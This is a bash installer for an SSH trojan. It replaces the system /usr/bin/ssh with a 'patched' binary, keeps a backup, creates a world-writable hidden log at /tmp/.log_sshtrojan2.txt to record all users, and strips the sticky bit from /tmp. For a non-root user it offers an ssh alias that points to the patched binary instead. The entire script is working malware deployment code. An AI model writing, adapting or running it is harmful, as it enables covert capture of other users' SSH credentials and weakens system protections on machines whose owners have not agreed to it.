#! /usr/bin/env bash

file_ssh_mod="$(pwd)/ssh"
file_ssh_home="$HOME/.local/bin/ssss"
file_ssh="/usr/bin/ssh"
file_ssh_backup="/usr/bin/ssh.backup"
file_log="/tmp/.log_sshtrojan2.txt"

# Create new log file
echo -n >$file_log
chmod 666 $file_log

printf "Do you want to log all users? (y/n): "
read choice

if [[ $choice == "y" ]]; then

	# check if the script is run with root privilege
	if [[ $EUID -eq 0 ]]; then

		# Check if /bin/ssh.backup exist
		if [[ -f $file_ssh_backup ]]; then
			echo "Exist $file_ssh_backup"
			printf "\nDelete file (d)\tRestore file (r)\nDo nothing (y)\tExit (press enter)\n(d/r/n/[enter]): "
			read choice

			if [[ $choice == "d" ]]; then
				printf "\nType \"confirm\" to confirm delete (confirm/[other]): "
				read confirm

				if [[ $confirm == "confirm" ]]; then
					rm "$file_ssh_backup"
					echo "Deleted"
				else
					echo "Cancelled"
				fi

				printf "\nContinue?: (y/[other]): "
				read choice
			elif [[ $choice == "r" ]]; then
				mv "$file_ssh_backup" "$file_ssh"
				echo "Restored"
				printf "\nContinue? (y/[other]): "
				read choice
			elif [[ $choice == "y" ]]; then
				:
			elif [[ -z $choice ]]; then
				echo "Exit"
				exit 0
			else
				echo "\nWrong command"
				exit 1
			fi
		fi

		# Check if user want to continue
		[[ $choice != "y" ]] && exit 0

		chmod -t /tmp
		printf "\nREMOVED STICKY BIT FROM /tmp\n"

		cp $file_ssh $file_ssh_backup
		cp $file_ssh_mod $file_ssh
		echo "Done"
	else
		echo "Need root privilege"
		exit 1
	fi
elif [[ $choice == "n" ]]; then
	printf "\nNote: this file must be in the same folder with patched ssh\n"
	echo "run: alias ssh=\"$(pwd)/ssh\""
	exit 0
else
	echo "Wrong command"
	exit 0
fi
